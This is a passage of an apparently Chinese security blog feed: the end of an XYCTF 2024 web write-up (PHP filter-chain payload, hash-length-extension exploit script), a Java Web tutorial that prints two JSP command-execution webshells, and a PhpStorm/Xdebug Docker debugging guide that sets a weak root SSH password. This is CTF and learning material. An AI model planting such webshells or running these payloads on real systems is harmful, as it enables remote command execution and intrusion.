class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把XYCTF多base64encode几次,然后用脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br></pre></td></tr></table></figure><p>得到的payload多加五个base64-decode即可</p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>这题可以用php_filter_chain直接解掉了, 但是考点看起来应该是nginx fast-cgi响应过大产生临时文件的那个trick</p><p><a href="https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi">https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi</a></p><p>后面补一下吧</p><h2 id="give-me-flag-赛后"><a href="#give-me-flag-赛后" class="headerlink" title="give me flag(赛后)"></a>give me flag(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">cc584e52a25c194614d8f8dff57c7f72</span><br></pre></td></tr></table></figure><p>一眼哈希扩展攻击, hashpump没了, 装了hexpand,一直报段错误….遂放弃</p><p>推荐另一个项目</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>可以在下面一个连接直接查看当前unix时间戳</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p><p>稍微预测一个提前量:</p><p>1714286382</p><p>1714286700</p><p>扩展md5</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144622394.png" alt="image-20240428144622394"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:55475/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?md5=e84fbfa78340af6d44eedfd75c59445d&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wait..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144636517.png" alt="image-20240428144636517"></p><h2 id="baby-unserialize-未解出"><a href="#baby-unserialize-未解出" class="headerlink" title="baby_unserialize(未解出)"></a>baby_unserialize(未解出)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF-2024-Web&quot;&gt;&lt;a href=&quot;#XYCTF-2024-Web&quot; class=&quot;headerlink&quot; title=&quot;XYCTF 2024 Web&quot;&gt;&lt;/a&gt;XYCTF 2024 Web&lt;/h1&gt;&lt;h2 id=&quot;warm-up&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="命令注入" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
    <category term="phar反序列化" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="LFI" scheme="http://example.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>Java Web基础</title>
    <link href="http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/</id>
    <published>2024-04-07T14:42:56.000Z</published>
    <updated>2024-05-21T14:59:12.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><h2 id="Tomcat＋Servlet"><a href="#Tomcat＋Servlet" class="headerlink" title="Tomcat＋Servlet"></a>Tomcat＋Servlet</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>不同java版本对应的tomcat和servlet不太一样, 这里搭配如下:</p><p>java 1.8</p><p>Servlet 3.1.0</p><p>Tomcat 8</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Tomcat-Servlet_Demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>手动创建war包目录</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428235641031.png" alt="image-20240428235641031"></p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他细节参考"><a href="#其他细节参考" class="headerlink" title="其他细节参考"></a>其他细节参考</h3><p><a href="https://www.jianshu.com/p/b4b42a90b2e9">https://www.jianshu.com/p/b4b42a90b2e9</a></p><p><a href="https://blog.csdn.net/qq_52057693/article/details/124260380">https://blog.csdn.net/qq_52057693/article/details/124260380</a></p><h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello 你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后访问</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429000025817.png" alt="image-20240429000025817"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><blockquote><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p></blockquote><p>直接在webapp文件夹下创建jsp文件即可</p><p>脚本程序的语法格式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>任何文本、HTML标签、JSP元素必须写在脚本程序的外面。</p><h3 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h3><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们。</p><p>JSP声明的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declaration; [ declaration; ]+ ... %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure><p>程序示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! int i = 0; %&gt; </span><br><span class="line">&lt;%! int a, b, c; %&gt; </span><br><span class="line">&lt;%! Circle a = new Circle(2.0); %&gt; </span><br></pre></td></tr></table></figure><hr><h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。</p><p>由于表达式的值会被转化成String，所以您可以在一个文本行中使用表达式而不用去管它是否是HTML标签。</p><p>表达式元素中可以包含任何符合Java语言规范的表达式，但是不能使用分号来结束表达式。</p><p>JSP表达式的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式 %&gt;</span><br></pre></td></tr></table></figure><p>同样，您也可以编写与之等价的XML语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   表达式</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>传统无回显木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429191039735.png" alt="image-20240429191039735"></p><p>有回显木马:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>如上的木马特征强,容易识别, 且需要文件落地, 由此,引出隐蔽性强,无需文件的内存马</p><h3 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h3><p>后面需要调试Tomcat, 重新弄个环境,参考:</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><p>在此之前, 需要先了解Tomcat架构</p><p>膜拜大佬博客</p><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><h4 id="Tomcat三大组件"><a href="#Tomcat三大组件" class="headerlink" title="Tomcat三大组件"></a>Tomcat三大组件</h4><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p>三大组件的加载顺序为<code>**Listener-&gt;Filter-&gt;Servlet**</code>。</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><blockquote><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p></blockquote><h4 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h4><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><blockquote><p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Web&quot;&gt;&lt;a href=&quot;#Java-Web&quot; class=&quot;headerlink&quot; title=&quot;Java Web&quot;&gt;&lt;/a&gt;Java Web&lt;/h1&gt;&lt;h2 id=&quot;Tomcat＋Servlet&quot;&gt;&lt;a href=&quot;#Tomcat＋Servlet&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP storm + Xdebug 远程调试docker项目</title>
    <link href="http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/"/>
    <id>http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/</id>
    <published>2024-03-27T14:02:29.000Z</published>
    <updated>2024-03-27T16:32:26.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-Xdebug-远程调试docker项目-ssh隧道"><a href="#PHP-storm-Xdebug-远程调试docker项目-ssh隧道" class="headerlink" title="PHP storm + Xdebug 远程调试docker项目(ssh隧道)"></a>PHP storm + Xdebug 远程调试docker项目(ssh隧道)</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li>docker环境</li><li>你需要调试的项目</li></ol><p>这里需要调试的项目以上次在做NKCTF的一道题目为例</p><p>题目原 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br></pre></td></tr></table></figure><p>我们需要对dockerfile进行修改以使用于调试</p><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>可以看见这里拉取了php8.0, 这里我们需要下载安装对应版本的xdebug, 这非常关键!!!</p><p>附一个各php版本对应的xdebug版本, 其他版本另行搜索</p><table><thead><tr><th>php版本</th><th>xdebug版本</th></tr></thead><tbody><tr><td>php7.0</td><td>xdebug 2.8.1</td></tr><tr><td>php7.1</td><td>xdebug 2.9.8</td></tr><tr><td>php7.2</td><td>xdebug 3.1.5</td></tr><tr><td>php7.3</td><td>xdebug 3.1.5</td></tr><tr><td>php7.4</td><td>xdebug 3.1.5</td></tr><tr><td>php8.0</td><td>xdebug 3.1.5</td></tr><tr><td>php8.1</td><td>xdebug 3.1.5</td></tr></tbody></table><p>因此我们需要的是xdebug 3.1.5</p><p>去这个网站查看xdebug(不需要下载下来)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327221042712.png" alt="image-20240327221042712"></p><p>可以看见对应有xdebug 3.1.5按照这个文件名, 添加一个dockerfile语句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    docker-php-ext-enable xdebug</span></span><br></pre></td></tr></table></figure><p>在Dockerfile的同级目录新建一个start.sh文件, 用于完成步骤3,4,5</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#设置 ssh 允许 root 登录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改root密码</span></span><br><span class="line"><span class="built_in">echo</span> root:123456 | chpasswd</span><br><span class="line"><span class="comment">#配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_host = host.docker.internal&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_port = 9003&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.mode = debug&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.max_nesting_level = 1000&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.discover_client_host = true&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="comment">#重启 nginx ssh</span></span><br><span class="line">service nginx restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span 